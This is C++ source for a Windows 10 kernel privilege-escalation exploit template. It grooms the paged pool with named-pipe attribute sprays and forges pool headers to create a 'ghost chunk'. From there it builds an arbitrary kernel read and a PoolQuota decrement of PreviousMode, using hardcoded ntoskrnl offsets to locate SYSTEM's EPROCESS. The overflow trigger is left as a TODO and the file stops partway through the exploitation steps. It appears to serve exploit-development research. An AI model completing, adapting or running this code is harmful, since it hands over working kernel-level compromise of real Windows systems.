#include <iostream>
#include <stdio.h>
#include <stdlib.h>
#include <Windows.h>
#include <Psapi.h>

#pragma comment (lib,"psapi")
#include "structs.h"

// TODO: OFFSET CONSTANTS (offsets from Windows 10 build 19042)
//	Note: Exploit can be upgraded to version independence with LoadLibrary on Npfs.sys and ntoskrnl.exe to find offsets at runtime
#define NPFS_NPFSDCREATE_FUNC_OFFSET 0xb540
#define NPFS_IMP_EXALLOCATEPOOLWITHTAG_OFFSET 0x7050
#define NT_EXALLOCATEPOOLWITHTAG_OFFSET 0x9b2030
#define NT_EXPPOOLQUOTACOOKIE_OFFSET 0xcfb9d0
#define NT_PSINITIALSYSTEMPROCESS_OFFSET 0xcfb420
///////////////////////////////////////////////

#define LFH_SIZE 0x160			// Should be same size as vulnerable object 
		//	Note: Ghost chunk technique works with smaller sizes, but more care must be taken when freeing objects to avoid BSODs
#define LOOKASIDE_SIZE 0x210		// Will also be size of ghost chunk
		//	Note: This value can be increased as needed; it just needs to be more than 0x200 in size to avoid using kLFH
#define INITIAL_LFH_SPRAY 0x30000	// Amount of kLFH-sized pipes to spray to fill holes for target size 
		//	Note: If exploit fails, it's likely due to holes in kLFH. Restart system or increase LFH spray size to remedy this

#define GHOST_PIPE_ARR_SIZE 0x200	// Amount of pipes to spray to retake vulnerable chunk (which will contain ghost chunk)
#define GHOST_NAME "GHOSTPA"		// Attribute name for allocating valid attributes that won't be read
#define QUEUE_NAME "FAKEPRC"		// Name for PIPE_QUEUE_ENTRY containing fake EPROCESS structure
#define ATTR_NAME "ABCD123"		// Attribute name used to fetch value in readPipeAttr function
#define ATTR_NAME_SIZE 8		// Size of attribute name (for chunk alignment = 0x8)
#define ATTR_STRUCT_SIZE 0x38		// Size of PIPE_ATTRIBUTE struct before data (name/value) is written
#define TEMP_ATTR_VALUE "1234567"	// 

DWORD currentPid = GetCurrentProcessId();	// Obtain current PID to search for this EPROCESS later

// Resolve addresses for NT api functions
_NtFsControlFile pNtFsControlFile = (_NtFsControlFile)GetProcAddress(GetModuleHandleA("ntdll.dll"), "NtFsControlFile");
_NtWriteVirtualMemory pNtWriteVirtualMemory = (_NtWriteVirtualMemory)GetProcAddress(GetModuleHandleA("ntdll.dll"), "NtWriteVirtualMemory");


////////////////////////////////////////////////////////////////////////////////////
// Functions to create (allocate+set data), read, and free PIPE_ATTRIBUTE objects //
////////////////////////////////////////////////////////////////////////////////////

// Create pipe attribute, setting its name and value with supplied attribute buffer
int createPipeAttr(char* attrBuf, int attrSize, char* pBuf, int pBufSize, OUT PPIPE_RW_HND pipeRWhandle) {
	NTSTATUS status;
	IO_STATUS_BLOCK ioStatus = { 0 };
	HANDLE pRead;
	HANDLE pWrite;

	// Check that pipes are large enough 
	if (attrSize < ATTR_STRUCT_SIZE) {
		printf("\n[-] Object size too small for successful pipe_attr alloc (minimum 0x%x)\n", ATTR_STRUCT_SIZE);
		return 1;
	} // Subtract from attrSize so that given size is used in pool allocation
	attrSize -= ATTR_STRUCT_SIZE;
	
	// If pipeRWhandle is not set, don't track the pipe
	if (pipeRWhandle == NULL) {
		if (!CreatePipe(&pRead, &pWrite, NULL, 0xFFFFFFFF)) {
			printf("\n[-] Failed to create named pipe for spray\n");
			return 1;
		} // Execute NtFsControlFile to create a PIPE_ATTRIBUTE
		status = pNtFsControlFile(
			pWrite, NULL, NULL, NULL, &ioStatus,
			0x11003C, //0x11002C for arg of set attribute is 2
			attrBuf, attrSize, pBuf, sizeof(pBuf)
		);
	}
	// Otherwise, populate struct with handles to pipe
	else {
		if (!CreatePipe(&pipeRWhandle->read, &pipeRWhandle->write, NULL, 0xFFFFFFFF)) {
			printf("\n[-] Failed to create named pipe for spray\n");
			return 1;
		} // Execute NtFsControlFile to create a PIPE_ATTRIBUTE
		status = pNtFsControlFile(
			pipeRWhandle->write, NULL, NULL, NULL, &ioStatus,
			0x11003C,	// CREATE+SET attribute opcode
			attrBuf, attrSize, pBuf, sizeof(pBuf)
		);
	}

	// Check if NtFsControlFile failed
	if (status != 0x0) {
		printf("\n[-] Failed to set pipe attribute with error 0x%lx\n", status);
		return 1;
	}

	return 0;
}

// Read value of pipe attribute from supplied named pipe
int readPipeAttr(char* pBuf, int pBufSize, IN PPIPE_RW_HND pipeRWhandle) {
	NTSTATUS status;
	IO_STATUS_BLOCK ioStatus = { 0 };

	// If pipeRWhandle is not set, return an error
	if (pipeRWhandle == NULL) {
		printf("[-] No pipe supplied, unable to read attributes\n");
		return 1;
	}

	// Execute NtFsControlFile to create a PIPE_ATTRIBUTE
	status = pNtFsControlFile(
		pipeRWhandle->write, NULL, NULL, NULL, &ioStatus,
		0x110038,	// GET attribute opcode
		(char*)ATTR_NAME, ATTR_NAME_SIZE, pBuf, pBufSize
	);
	// Check if NtFsControlFile failed
	if (status != 0x0) {
		printf("\n[-] Failed to get pipe attribute data with error 0x%lx\n", status);
		return 1;
	}

	return 0;
}

// Free pipe attributes by freeing associated pipe
void freePipeAttr(PPIPE_RW_HND pipeRWhandles) {
	// Close read and write handles to free pipe attribute
	CloseHandle(pipeRWhandles->write);
	CloseHandle(pipeRWhandles->read);
	return;
}



////////////////////////////////////////////////////////////////////////////////////////////////////////////
// Functions to groom the kernel pool through spraying kLFH and enabling the lookaside list for VS allocs //
////////////////////////////////////////////////////////////////////////////////////////////////////////////

// Fill holes in paged kernel pool with PIPE_ATTRIBUTE objects
int sprayPipes(ULONG numPipes, int attrSize) {
	// Create buffer for PIPE_ATTRIBUTE data
	char* attrBuf = (char*)malloc(0x1000);

	// Create output buffer filled with "0x91" 
	char pBuf[0x100];
	int pBufSize = sizeof(pBuf);
	memset(pBuf, 0x91, pBufSize);

	// Begin allocation of PIPE_ATTRIBUTES to fill holes in paged pool
	for (ULONG i = 0; i < numPipes; i++) {
		if (createPipeAttr(attrBuf, attrSize, pBuf, pBufSize, NULL)) {
			return 1;
		}
	}

	// Clean up and return
	free(attrBuf);
	return 0;
}

// Allocate and free objects of low sizes to create holes in kLFH kernel pool. Outputs final set of allocated pipe attributes
int makeHoles(int attrSize, OUT PIPE_RW_HND* remainingPipesArray, int remainingPipesSize) {
	// Allocate array to store pipe handles for freePipeAttr
	int allocHoleAmount = remainingPipesSize + 6;
	PIPE_RW_HND* sprayPipesArray = (PIPE_RW_HND*)malloc(sizeof(PIPE_RW_HND) * allocHoleAmount);
	if (sprayPipesArray == NULL) { return 1; }

	// Create buffer for PIPE_ATTRIBUTE data, marked with ZYZ string 
	char* attrBuf = (char*)malloc(0x1000);
	if (attrBuf == NULL) { return 1; };
	memcpy(attrBuf, "ZYZ", 4);

	// Create output buffer filled with "0x95"
	char pBuf[0x100];
	int pBufSize = sizeof(pBuf);
	memset(pBuf, 0x95, pBufSize);

	// Begin allocation of PIPE_ATTRIBUTES to fill holes in paged pool
	printf("[*] Creating 0x%x size holes in paged pool...", attrSize);
	for (int i = 0; i < allocHoleAmount; i++) {
		if (createPipeAttr(attrBuf, attrSize, pBuf, pBufSize, &(sprayPipesArray[i]))) {
			return 1;
		}
	}
	// Create 5 holes in pool, starting halfway through allocated attributes
	int freedPipes[10];
	int fpIterate = 0;
	for (int i = (allocHoleAmount/2); i < allocHoleAmount; i += (allocHoleAmount/2/5)) {
		freePipeAttr(&(sprayPipesArray[i]));
		//printf("\n[DEBUG] Freed pipe %d\n", i);
		freedPipes[fpIterate] = i;
		fpIterate++;
	}
	printf("done\n");

	// Save first half of pipes
	for (int i = 0; i < (allocHoleAmount/2); i++) {
		remainingPipesArray[i] = sprayPipesArray[i];
		//printf("[DEBUG] Setting remaining pipe %d from %d\n", i, i);
	} 
	// Save last half of pipes, skipping ones that have been freed
	int oldArrIterate = allocHoleAmount / 2;
	for (int i = (allocHoleAmount/2); i < remainingPipesSize; i++) {
		// Skip pipe if included in list of freed members
		for (int j = 0; j < fpIterate; j++) {
			if (oldArrIterate == freedPipes[j]) {
				//printf("[DEBUG] Skipping %d from orig pipe array\n", freedPipes[j]);
				oldArrIterate++;
			}
		}
		remainingPipesArray[i] = (PIPE_RW_HND)(sprayPipesArray[oldArrIterate]);
		//printf("[DEBUG] Setting 2nd half pipe %d from %d\n", i, oldArrIterate);
		oldArrIterate++;
	}
	
	// Clean up and return
	if (attrBuf) { free(attrBuf); }
	if (sprayPipesArray) { free(sprayPipesArray); }
	return 0;
}

// Enable dynamic lookaside list (LIFO allocations) for sizes above 0x200
/*  This seems to work well enough, but I'm open to solutions for *examining* the lookaside list.
 *	"!lookaside" and "!lookaside -all" commands in WinDbg return some info, but don't seem to show 
 *	anything relevant to recently enabled/allocated/freed sizes in the lookaside list. 
*/
int enableLookaside(int attrSize) {
	// Begin allocation of PIPE_ATTRIBUTES to enable lookaside list
	printf("[*] Enabling dynamic lookaside list for size 0x%x...", attrSize);
	if (sprayPipes(0x10000, attrSize)) {
		return 1;
	}
	// Sleep 2 seconds, then continue spray
	Sleep(2000);
	if (sprayPipes(0x10000, attrSize)) {
		return 1;
	}
	// Sleep 1 second, then finish spray
	Sleep(1000); 
	if (sprayPipes(0x100, attrSize)) {
		return 1;
	}
	printf("done\n");
	return 0;
}



/////////////////////////////////////////////////////////////////////////
// Create fake chunk header values for overflown chunk and ghost chunk //
/////////////////////////////////////////////////////////////////////////
	/* Chunk header structure:
	*       struct POOL_HEADER
	*       {
	*               char PreviousSize;       // Used in overflown chunk header to enable allocation of ghost chunk
	*               char PoolIndex;
	*               char BlockSize;          // Used in fake chunk (pointed to after overflow chunk freed) to set ghost chunk size
	*               char PoolType;
	*               int  PoolTag;
	*               Ptr64 ProcessBilled;
	*       }
	*/
// Create header value to overwrite adjacent header with, setting CacheAligned and PreviousSize to create ghost chunk
ULONGLONG createOverflowHeader(ULONGLONG poolTag, ULONGLONG freedChunkSize) {
	// Shift pool tag bytes to upper half of qword
	poolTag = poolTag << (8 * 4);

	// Pool type is PAGED_POOL; set CacheAligned bit with OR against 0x4
	ULONGLONG pagedPool = 0x1;	// PAGED_POOL (0x1)
	ULONGLONG overflowPoolType =  (pagedPool | 0x4) << (8 * 3);

	// Set PreviousSize to size of vulnerable chunk minus the offset desired into previous chunk
	//	PIPE_ATTRIBUTE->data offset is +0x38 (+0x8 for chunk alignment)
	ULONGLONG overflowPrevSize = ((freedChunkSize - (ATTR_STRUCT_SIZE + 0x8)) >> 4);

	// Return constructed header for overflow value
	return (poolTag + overflowPoolType + overflowPrevSize);
}

// Create ghost chunk header with large BlockSize to enable allocation by lookaside list
ULONGLONG createGhostHeader(ULONGLONG poolTag, ULONGLONG ghostChunkSize) {
	// Shift pool tag bytes to upper half of qword
	poolTag = poolTag << (8 * 4);
	// PoolType must NOT have CacheAligned or PoolQuota bits set
	ULONGLONG pagedPool = 0x1;	// PAGED_POOL (0x1)
	ULONGLONG ghostPoolType = (pagedPool) << (8 * 3);

	// Set BlockSize to desired size of ghost chunk
	ULONGLONG ghostBlockSize = (ghostChunkSize >> 4) << (8 * 2);

	// Return constructed header
	return (poolTag + ghostPoolType + ghostBlockSize);
}



/////////////////////////////////////////////
// Functions to find allocated ghost chunk //
/////////////////////////////////////////////

// Read QWORD value from pipe attribute output buffers
ULONGLONG getQwordFromBuf(char* inBuf) {
	ULONGLONG qwordValue = 0;

	// Add first DWORD
	qwordValue += (ULONGLONG)(inBuf[0]) << (8 * 0) & 0xff;
	qwordValue += (ULONGLONG)(inBuf[1]) << (8 * 1) & 0xff00;
	qwordValue += (ULONGLONG)(inBuf[2]) << (8 * 2) & 0xff0000;
	qwordValue += (ULONGLONG)(inBuf[3]) << (8 * 3) & 0xff000000;

	// Add second DWORD
	qwordValue += (ULONGLONG)(inBuf[4]) << (8 * 4) & 0xff00000000;
	qwordValue += (ULONGLONG)(inBuf[5]) << (8 * 5) & 0xff0000000000;
	qwordValue += (ULONGLONG)(inBuf[6]) << (8 * 6) & 0xff000000000000;
	qwordValue += (ULONGLONG)(inBuf[7]) << (8 * 7) & 0xff00000000000000;

	// Return value
	return qwordValue;
}

// Read each object's data in ghostHeaderPipesArray to find which one now contains the ghost chunk
int findGhostChunk(PIPE_RW_HND* ghostHeaderPipesArray, char* ghostOut, int ghostOutSize) {
	ULONGLONG ghostQword = 0;	// 64 bit value to be read from ghostOut data
	int foundGhost = -1;		// Will be set to index of chunk that contains ghost chunk 

	for (int i = 0; i < GHOST_PIPE_ARR_SIZE; i++) {
		// Zero out buffer again before reading pipe attribute
		memset(ghostOut, 0x0, ghostOutSize);
		if (readPipeAttr(ghostOut, ghostOutSize, &(ghostHeaderPipesArray[i]))) {
			printf("[-] Failed to read pipe attribute\n");
			return -1;
		}
		// Look for kernel pointers inside PIPE_ATTRIBUTE data from ghost chunk
		ghostQword = getQwordFromBuf(ghostOut + 0x10);
		if (ghostQword > 0xF000000000000000) {
			printf("[+] Ghost chunk detected: kernel pointer %llx found in pipe %d\n", ghostQword, i);
			foundGhost = i;			// Set foundGhost to LFH array member containing ghost chunk
			i = GHOST_PIPE_ARR_SIZE;	// Break loop
		}
		ghostQword = 0;
	}
	// Return index of ghost chunk in ghostHeaderPipesArray
	//	If successful, the ghostOut buffer will now contain the ghost chunk's data
	return foundGhost;
}



///////////////////////////////////////////////////////////////////////////////
// Functions to abuse ghost chunk for read primitive and arbitrary decrement //
///////////////////////////////////////////////////////////////////////////////

// Create fake ghost chunk and userland pipe attribute structure
ULONGLONG createFakePipeAttrs(IN char* ghostData, int ghostDataSize, OUT char* ghostChunk, OUT char* userlandAttr) {
	ULONGLONG oldFlinkPtr = 0;

	// Create a fake chunk that will be used to rewrite the ghost chunk's header and data
	memcpy(ghostChunk, ATTR_NAME, ATTR_NAME_SIZE);					// Set attribute name before actual fake chunk data
	memcpy(ghostChunk + ATTR_NAME_SIZE, ghostData, ghostDataSize);	// Copy leaked ghost pipe data
	PPIPE_ATTRIBUTE ghostAttribute = (PIPE_ATTRIBUTE*)(ghostChunk + ATTR_NAME_SIZE + sizeof(LIST_ENTRY));
	oldFlinkPtr = (ULONGLONG)ghostAttribute->list.Flink;
	ghostAttribute->list.Flink = (LIST_ENTRY*)userlandAttr;
	ghostAttribute->list.Blink = (LIST_ENTRY*)userlandAttr;	// Corrupt Blink as well to avoid instability (still works without this though)

	// Populate data in fake userland pipe
	PLIST_ENTRY fakeList = new LIST_ENTRY;
	fakeList->Flink = (LIST_ENTRY*)0xCAFEBEEF;
	fakeList->Blink = (LIST_ENTRY*)0xBEEFCAFE;
	PPIPE_ATTRIBUTE userlandAttribute = (PIPE_ATTRIBUTE*)userlandAttr;
	userlandAttribute->list.Flink = fakeList->Flink;
	userlandAttribute->list.Blink = fakeList->Blink;
	userlandAttribute->AttributeName  = (char*)ATTR_NAME;
	userlandAttribute->AttributeValue = (char*)0xDEADCAFEBABA;	// Placeholder value
	userlandAttribute->ValueSize = 0x100;

	//printf("[DEBUG] Address of fake ghost chunk data: %p | Address of fake userland pipe %p\n", 
	//	ghostChunk, userlandAttr);
	return oldFlinkPtr;
}

// Read arbitrary data from kernel space with userland pipe attribute
ULONGLONG fakePipeRead(PIPE_RW_HND* ghostPipe, char* fakeAttr, ULONGLONG readAddr) {
	// Rewrite fake userland attribute for read primitive
	ULONGLONG readQword = 0;
	PPIPE_ATTRIBUTE userlandAttribute = (PIPE_ATTRIBUTE*)fakeAttr;
	userlandAttribute->AttributeValue = (char*)readAddr;	// Set value addr to read from

	// Allocate temporary buffer to store attribute value
	int readBufSize = LOOKASIDE_SIZE;
	char* readBuf = (char*)malloc(readBufSize);
	if (readBuf == NULL) { return readQword; }
	memset(readBuf, 0x0, readBufSize);

	// Read and return data from kernel
	if (readPipeAttr(readBuf, readBufSize, ghostPipe)) {
		printf("[-] Failed to read pipe attribute\n");
		return readQword;
	}
	//printf("[DEBUG] Read buffer address (enter to continue): %p\n", readBuf); getchar();
	readQword = getQwordFromBuf(readBuf + 0);

	// Free buffer and return read bytes
	free(readBuf);
	return readQword;
}

// Initialize fake EPROCESS at beginning of exploit to avoid instability
void initFakeEprocess(char* fakeEprocessDataBuffer, DWORD fakeEprocSize) {
	// Set attribute name for pipe queue entry object
	memcpy(fakeEprocessDataBuffer, QUEUE_NAME, ATTR_NAME_SIZE);
	//char* fakeEprocStructPtr = (char*)((ULONGLONG)fakeEprocessDataBuffer + 0x50);

	// Set other qwords in EPROCESS to avoid invalid structure errors
	memset((fakeEprocessDataBuffer + 0x50), 0x51, (fakeEprocSize-0x50));
	memset((fakeEprocessDataBuffer + 0x50) - 0x40, 0xA, 0x40);
	memset((fakeEprocessDataBuffer + 0x50) - 0x18, 0xB, 0x1);
	memset((fakeEprocessDataBuffer + 0x50), 0x3, 1);
	ULONGLONG patchValue1 = 0xAAAAAAAAAAAAAcfc;
	ULONGLONG patchValue2 = 0xAAAAAAAAAAA255dc;
	memcpy((fakeEprocessDataBuffer+0x50) + 0xc0, &patchValue1, 4);
	memcpy((fakeEprocessDataBuffer+0x50) + 0xc4, &patchValue2, 4);
	memcpy((fakeEprocessDataBuffer+0x50) + 0xc8, &patchValue1, 4);
	memcpy((fakeEprocessDataBuffer+0x50) + 0xcc, &patchValue2, 4);
	return;
}

// Allocate PIPE_QUEUE_ENTRY in kernel space that contains faked EPROCESS with PoolQuota->DecrementAddress
/*	Note: The fake EPROCESS should only be a PIPE_QUEUE_ENTRY if the vuln chunk is in the Paged pool;
 *	if vuln chunk is Nonpaged use a PIPE_ATTRIBUTE for fake EPROCESS instead
*/
int allocFakeEprocess(char* fakeEproc, DWORD fakeEprocSize, PIPE_RW_HND* ghostPipe, ULONGLONG targetDecrement) {
	// Set PoolQuota (EPROCESS+0x568) of fake EPROCESS(+0x50 in PIPE_QUEUE_ENTRY) to target address for decrement
	memcpy(fakeEproc + 0x50 + 0x568, &targetDecrement, 0x8);

	// Create PIPE_QUEUE_ENTRY in kernel space
	DWORD resultLen = 0;
	if (!WriteFile(ghostPipe->write, fakeEproc, fakeEprocSize, &resultLen, NULL)) {
		printf("[-] Failed to allocate PIPE_QUEUE_ENTRY for fake EPROCESS\n");
		return 1;
	}
	return 0;
}

// Create ghost chunk with PoolQuota bit set for arbitrary decrement
void createGhostDecrement(char* ghostChunkBuf, ULONGLONG oldFlinkValue, ULONGLONG poolQuotaValue) {
	// Set PoolQuota bit in chunk header (0x8 = 0y00001000), then set ProcessBilled (poolQuota)
	PULONGLONG gChunkHeader = (ULONGLONG*)(ghostChunkBuf + ATTR_NAME_SIZE);
	ULONGLONG quotaBit = (0x8 << (8 * 3)) & 0xff000000;

	// Target address will be decremented by Blocksize(<<4), so set it to 0x10 for a decrement of 0x100 (overflow into higher byte)
	ULONGLONG bSizeByte = ((0x100 >> 4) << (8 * 2)) & 0xff0000;
	ULONGLONG bSizeMask = 0xffffffffff00ffff;

	// If poolQuota is 0, the read primitive likely failed. Do not set PoolQuota bit to avoid BSOD in that case
	if (poolQuotaValue != 0) {
		// Zero out BlockSize byte, then set it to 0x10
		gChunkHeader[0] = gChunkHeader[0] & bSizeMask;
		gChunkHeader[0] = gChunkHeader[0] | bSizeByte;

		// Set quotaBit and add encrypted ProcessBilling address
		gChunkHeader[0] = gChunkHeader[0] | quotaBit;
		gChunkHeader[1] = poolQuotaValue;
	}

	// Restore original list entry Flink to avoid BSOD when ghost chunk is freed
	PPIPE_ATTRIBUTE ghostAttribute = (PIPE_ATTRIBUTE*)(ghostChunkBuf + ATTR_NAME_SIZE + 0x10);
	ghostAttribute->list.Flink = (LIST_ENTRY*)oldFlinkValue;
	ghostAttribute->list.Blink = (LIST_ENTRY*)oldFlinkValue;
	return;
}

// Free ghost chunk by setting a PIPE_ATTRIBUTE on its named pipe with an empty value (will change attribute value by replacing object)
int executeDecrement(PIPE_RW_HND* ghostPipe) {
	NTSTATUS status;
	IO_STATUS_BLOCK ioStatus = { 0 };
	int attrSize = LOOKASIDE_SIZE - ATTR_STRUCT_SIZE;

	// Allocate input and output buffers
	char* attrBuf = (char*)malloc(attrSize);
	char* pBuf = (char*)malloc(attrSize);
	if (attrBuf == 0 || pBuf == 0) {
		printf("[-] Could not allocate buffers for NtFsControlFile call\n");
		return 1;
	}
	memset(attrBuf, 0x0, attrSize);
	memcpy(attrBuf, GHOST_NAME, ATTR_NAME_SIZE);
	memset(pBuf, 0x0, attrSize);


	// Execute NtFsControlFile to replace ghost attribute
	status = pNtFsControlFile(
		ghostPipe->write, NULL, NULL, NULL, &ioStatus,
		0x11003C, //0x11002C for arg of set attribute is 2
		attrBuf, attrSize, pBuf, sizeof(pBuf)
	);
	// Check if NtFsControlFile failed
	if (status != 0x0) {
		printf("\n[-] Failed to set pipe attribute with error 0x%lx\n", status);
		return 1;
	}
	return 0;
}


//////////////////////////////////////////////////////////////////////////////////////
// Functions to read and write arbitrary 64 bit values after PreviousMode decrement //
//////////////////////////////////////////////////////////////////////////////////////

// Read primitive function
ULONGLONG read_qword(ULONGLONG where) {
	ULONGLONG rqword = 0;
	SIZE_T rbytes;

	if (!ReadProcessMemory((HANDLE)-1, (LPVOID)where, &rqword, sizeof(ULONGLONG), &rbytes))
	{
		printf("[-] Error while calling ReadProcessMemory(): %d\n", GetLastError());
		return 1;
	}
	return rqword;
}

// Write primitive function
void write_qword(ULONGLONG where, ULONGLONG what) {
	NTSTATUS status = pNtWriteVirtualMemory((HANDLE)-1, (LPVOID)where, &what, sizeof(ULONGLONG), NULL);
	if (status != 0) {
		printf("[-] NtWriteVirtualMemory failed with status 0x%x\n", status);
	}
}




int main() {
	///////////////////////////////////////////////////
	// Initialize variables needed for main function //
	///////////////////////////////////////////////////

	char* findDecrementBuf = (char*)malloc(0x1000);//DEBUG
	memset(findDecrementBuf, 0x41, 0x1000);

	BOOL success = false;						// Initialize return value
	const int remainingPipesSize = 64 - 6;				// Create 64 pipes for makeHoles (6 of them will be freed in makeHoles function)
	int pipeBufSize = 0x1000;					// Size for input and output buffers of allocated pipe attributes
	int fakePipeSize = 0x1000;					// Size of pipe attributes for ghost pipe replacement and fake userland pipe
	int ghostIndex = -1;						// Value used to track pipe array index when finding object containing ghost chunk
	PIPE_RW_HND remainingPipesArray[remainingPipesSize] = { 0 };

	// Create fake chunk header used in overflowing adjacent chunk and ghost header 
	ULONGLONG pipeAttributeTag = 0x7441704e;					// NpAt (tApN with reversed endianness)
	ULONGLONG overflowHeader = createOverflowHeader(pipeAttributeTag, LFH_SIZE);	//
	ULONGLONG ghostHeader = createGhostHeader(pipeAttributeTag, LOOKASIDE_SIZE);	// Ghost header written into pipe attribute data

	// Create array of pipes that will CONTAIN the ghost header in its data, to be referenced once overflown chunk is freed
	char* ghostHeaderAttrBuf = (char*)malloc(0x1000);
	if (ghostHeaderAttrBuf == NULL) { return false; };
	memset(ghostHeaderAttrBuf, 0x0, 0x1000);			// Zero out attribute buffer
	memcpy(ghostHeaderAttrBuf, ATTR_NAME, ATTR_NAME_SIZE);		// Padding 32 bits for alignment (and as attribute name, used for reading)
	memcpy(ghostHeaderAttrBuf + 8, &ghostHeader, 0x8);		// Write ghostHeader after alignment
	PIPE_RW_HND* ghostHeaderPipesArray = (PIPE_RW_HND*)malloc(sizeof(PIPE_RW_HND) * (GHOST_PIPE_ARR_SIZE*2));	
	if (ghostHeaderPipesArray == NULL) { return false; }		// Allocate extra space (x2) for final ghost chunk retake later on

	// Create buffers used in ghost chunk itself (ghostOut buffer will be reused for reading pipe attribute data)
	PPIPE_RW_HND ghostChunk = new PIPE_RW_HND;	
	char* ghostBuf = (char*)malloc(pipeBufSize);			// Buffer to hold ghost chunk's data
	if (ghostBuf == NULL) { return false; }				//
	memset(ghostBuf, 0x0, pipeBufSize);				//
	memcpy(ghostBuf, GHOST_NAME, ATTR_NAME_SIZE);			//
	char* ghostOut = (char*)malloc(pipeBufSize);			// Output buffer (zeroed out and reused for pipe reads)
	if (ghostOut == NULL) { return false; }				//
	int ghostOutSize = LFH_SIZE - ATTR_STRUCT_SIZE;			// Size of attribute data (-size of PIPE_ATTRIBUTE struct)

	// Allocate buffers for fake ghost chunk and fake userland pipe attribute
	char* fakeGhostChunk = (char*)malloc(fakePipeSize);
	if (fakeGhostChunk == NULL) { return false; }
	memset(fakeGhostChunk, 0x0, fakePipeSize);
	char* fakeUserlandPipeAttr = (char*)malloc(fakePipeSize);
	if (fakeUserlandPipeAttr == NULL) { return false; }	
	memset(fakeUserlandPipeAttr, 0x0, fakePipeSize);

	// Initialize fake EPROCESS structure (Set QuotaBlock at offset +0x568 after this KTHREAD is leaked)
	DWORD fakeEprocessSize = 0x1000;
	char* fakeEprocessData = (char*)malloc(fakeEprocessSize);
	if (fakeEprocessData == NULL) {
		printf("[-] Could not initialize fake EPROCESS structure\n");
		return false;
	}
	memset(fakeEprocessData, 0x0, fakeEprocessSize);
	initFakeEprocess(fakeEprocessData, fakeEprocessSize);

	// Init variables to store addreses from read primitive step
	ULONGLONG iterPid = 0;	// Used to iterate through EPROCESS structures when searching for current process
	ULONGLONG iterProc = 0;	// 
	ULONGLONG kghostAddr	= 0;	// Stores address of ghost chunk in kernel pool (helpful for cleanup after decrement if needed)
	ULONGLONG restoreFlink	= 0;	// Stores original ghost chunk Flink pointer
	ULONGLONG ntosbase	= 0;	// Store base address of ntoskrnl.exe in kernelmode
	ULONGLONG systemEproc	= 0;	// Store EPROCESS for SYSTEM process 
	ULONGLONG thisEproc	= 0;	// Store EPROCESS for the current process
	ULONGLONG kthreadPtr	= 0;	// Store KTHREAD address for decrement
	ULONGLONG kpoolCookie	= 0;	// Store cookie value that ProcessBilled is XOR'd with
	ULONGLONG kFakeEprocAddr= 0;	// Store address of fake EPROCESS stored in PIPE_QUEUE_ENTRY object
	ULONGLONG poolQuota	= 0;	// Stores encrypted PoolQuota value
	ULONGLONG rw_where	= 0;	// read/write where 
	ULONGLONG w_what	= 0;	// write what value


	////////////////////////
	// BEGIN EXPLOITATION //
	////////////////////////
	
	///////////////////////////////////////
	// Prepare overflow for exploitation //
	///////////////////////////////////////
	
	// TODO: Write code here
	//


	////////////////////////////////////////////////////////////////////////////////////////////
	// Perform feng-shui on target kLFH size, then enable lookaside list for ghost chunk size //
	////////////////////////////////////////////////////////////////////////////////////////////

	// Enable dynamic lookaside list for ghost chunk size 
	if (enableLookaside(LOOKASIDE_SIZE)) {
		printf("\n[-] Failed to enable lookaside list\n");
		goto CLEANUP;
	}
	// Spray pipe attributes in paged pool for target lfh size 
	printf("[*] Spraying kLFH in kernel paged pool...");
	if (sprayPipes(INITIAL_LFH_SPRAY, LFH_SIZE)) {
		printf("\n[-] Pipe attribute spray failed\n");
		goto CLEANUP;
	}
	printf("done\n");
	// Create holes in paged pool kLFH for target lfh size, setting data in remaining pipes to contain ghost header
	if (makeHoles(LFH_SIZE, remainingPipesArray, remainingPipesSize)) {
		printf("\n[-] Making holes in kLFH failed\n");
		goto CLEANUP;
	}


	//////////////////////////////////////////////////////////////////////////////////////
	// Trigger overflow to corrupt adjacent chunk. Free the vulnerable chunk afterwards //
	//////////////////////////////////////////////////////////////////////////////////////

	// TODO: Trigger paged pool overflow
	//


	///////////////////////////////////////////////////////////////////////////////////
	// Retake vulnerable chunk with pipe attribute that contains ghost chunk header, // 
	//  then free corrupted chunk to add ghost chunk to lookaside list		 //
	///////////////////////////////////////////////////////////////////////////////////

	// Retake freed vulnerable chunk with more objects in LFH 
	printf("[*] Spraying %d pipe attributes to take back vulnerable chunk\n", GHOST_PIPE_ARR_SIZE);
	for (int i = 0; i < GHOST_PIPE_ARR_SIZE; i++) {
		if (createPipeAttr((char*)ghostHeaderAttrBuf, LFH_SIZE, ghostOut, ghostOutSize, &(ghostHeaderPipesArray[i]))) {
			goto CLEANUP;
		}
	}	

	// Drain lookaside list again just in case entries were added
	printf("[*] Draining lookaside list before creation of ghost chunk\n");
	if (sprayPipes(0x100, LOOKASIDE_SIZE)) { goto CLEANUP; }

	// Free latest LFH pipes to trigger ghost chunk 
	printf("[*] Freeing pipe attributes in kLFH to create ghost chunk\n");
	for (int i = 0; i < remainingPipesSize; i++) {
		freePipeAttr(&(remainingPipesArray[i]));
	}

	// Allocate ghost chunk with new allocation of 0x210 bytes (ghost chunk should be most recent lookaside entry for 0x210)
	printf("[*] Attempting to allocate ghost chunk from lookaside list\n");
	if (createPipeAttr(ghostBuf, LOOKASIDE_SIZE, ghostOut, ghostOutSize, ghostChunk)) { goto CLEANUP; }


	//////////////////////////////////////////////////////////////////////////////////////////////////////////////////
	// Find ghost chunk, then build read primitive by corrupting ghost chunk's FLINK to point to fake userland pipe //
	//////////////////////////////////////////////////////////////////////////////////////////////////////////////////
	
	// Find which of the pipe attributes in LFH now contains the ghost chunk
	ghostIndex = findGhostChunk(ghostHeaderPipesArray, ghostOut, ghostOutSize);
	if (ghostIndex < 0) {
		printf("[-] Could not find ghost chunk, exploit failed (try spraying target kLFH more)\n");
		goto CLEANUP;
	}

	// Build fake pipes for read primitive
	restoreFlink = createFakePipeAttrs(ghostOut, LFH_SIZE, fakeGhostChunk, fakeUserlandPipeAttr);
	memset(ghostOut, 0x0, ghostOutSize);
	
	// Fill any new holes in kLFH before freeing attribute containing ghost chunk
	printf("[*] Grooming kLFH again before freeing object holding the ghost chunk\n");
	if (sprayPipes(0x400, LFH_SIZE)) {
		printf("[-] Pipe attribute spray failed\n");
		goto CLEANUP;
	}

	// Create holes in paged pool kLFH for target lfh size, setting data in remaining pipes to contain ghost header
	if (makeHoles(LFH_SIZE, remainingPipesArray, remainingPipesSize)) {
		printf("\n[-] Making holes in kLFH failed\n");
		goto CLEANUP;
	}
	
	// Free pipe attr containing ghost chunk
	printf("[*] Replacing pipe attribute that contains ghost chunk\n");
	freePipeAttr(&(ghostHeaderPipesArray[ghostIndex]));

	// Spray to retake attribute that contains ghost chunk, corrupting ghost chunk->list.Flink to point to fake attribute
